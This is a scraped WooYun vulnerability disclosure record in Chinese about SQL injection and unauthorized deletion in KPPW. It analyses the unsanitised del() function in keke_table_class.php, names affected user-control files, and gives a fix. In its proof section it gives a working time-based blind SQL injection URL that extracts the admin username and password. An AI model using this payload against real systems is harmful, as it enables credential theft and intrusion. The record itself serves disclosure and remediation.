{"id": 45985, "wybug_id": "wooyun-2014-086270", "wybug_title": "KPPW最新版SQL注入漏洞四(同一问题引发多处注入及越权含分析）", "wybug_corp": "keke.com", "wybug_author": "xfkxfk", "wybug_date": "2014-12-07 19:35", "wybug_open_date": "2015-03-07 19:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-07：\t细节向公众公开  简要描述： KPPW最新版SQL注入漏洞四(同一问题引发多处注入及越权） 详细说明：  KPPW最新版SQL注入漏洞四(同一问题引发多处注入及越权）文件/control/user/account_report.php\n$objReportT = keke_table_class::get_instance('witkey_report');if (isset ( $action )) {\tswitch ($action) {\t\tcase 'mulitDel' :\t\t\tif ($ckb) {\t\t\t\t$objTaskT->del ( 'task_id', $ckb );\t\t\t\tkekezu::show_msg ( '删除成功', $strUrl, NULL, NULL, 'ok' );\t\t\t} else {\t\t\t\tkekezu::show_msg ( '删除失败', NULL, NULL, NULL, 'error' );\t\t\t}\t\t\tbreak;\n在$objTaskT->del ( 'task_id', $ckb );中，$ckb进入了del函数跟着del函数，文件/lib/inc/keke_table_class.php\nfunction del($pk, $val, $url = null) {\t\tif (! $val) {\t\t\treturn false;\t\t}\t\tif (is_array ( $val ) && ! empty ( $val )) {\t\t\t$ids = implode ( ',', $val );\t\t\t$this->_table_obj->setWhere ( \" $pk in ($ids)\" );\t\t} elseif ($val) {\t\t\t$this->_table_obj->setWhere ( \"$pk = \" . $val );\t\t}\t\t$del_query = \"del_\" . $this->_pre . $this->_table_name;\t\treturn $this->_table_obj->$del_query ();\t}\n可以看到这里的val，既是ckb变量当val不为空，且不为数字时，直接进入where条件语句中，切勿引号保护，导致sql注入\n这里有一个bug：del函数是/lib/inc/keke_table_class.php文件中的函数但是在这里/lib/inc/keke_table_class.php文件实例化为：$objReportT = keke_table_class::get_instance('witkey_report');而$objTaskT这里是没有初始化的对象导致无法触发这里的del函数\n还有同意问题在文件/control/user/account_rights.php因为这里的函数del，在文件/lib/inc/keke_table_class.php中，为一个全局的函数很多地方都会调用：\n\n这里后台触发就不管了（话说后天漏洞真是没人管。。。）前台的一共有二十多个触发点和文件部分过滤处理了还剩下多出个可以出发的\n/control/user/message_detail.php/control/user/message_notice.php/control/user/message_private.php/control/user/shop_caselist.php/control/user/transaction_released.php/control/user/transaction_service.php\n这里已/control/user/transaction_service.php为例：\n$strModelName = $kekezu->_model_list[$intModelId]['model_code'];$arrStatus = call_user_func ( array ($strModelName.'_shop_class', 'get_'.$strModelName.'_status') );$objServiceT = keke_table_class::get_instance('witkey_service');if (isset ( $action )) {\tswitch ($action) {\t\tcase 'mulitDel' :\t\t\tif ($ckb) {\t\t\t\t$objServiceT->del ( 'service_id', $ckb );\t\t\t\tkekezu::show_msg ( '删除成功', $strUrl, NULL, NULL, 'ok' );\t\t\t} else {\t\t\t\tkekezu::show_msg ( '删除失败', NULL, NULL, NULL, 'error' );\t\t\t}\t\t\tbreak;\n同意存在注入二期这里在删除各种数据时，只根据id进行删除，没有判断用户属性，导致越权操作删除任意用户权限下的内容这里包括删除管理员创建的模块和数据都可以删除   漏洞证明：  SQL注入：\nhttp://localhost/KPPW2520141118UTF-8/index.php?do=user&view=transaction&op=service&action=mulitDel&ckb=1161 and 1=if(mid((select concat(username,password) from keke_witkey_member limit 0,1),1,1)=char(97),sleep(5),2)\n看看SQL执行结果：\n\n这里会延迟5秒后返回\n\n说明UserName+password的第一个字符是a这里的cbk就是服务模块的service_id这里的cbk=1161是admin用户创建的模块，也是可以删除的，导致越权操作   修复方案：  加intval或者单引号保护即可   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-12-08 16:08 厂商回复： 感谢您的支持，我们会尽快处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-07 22:15 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 学姿势，学思路。)\t\t \n  中！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}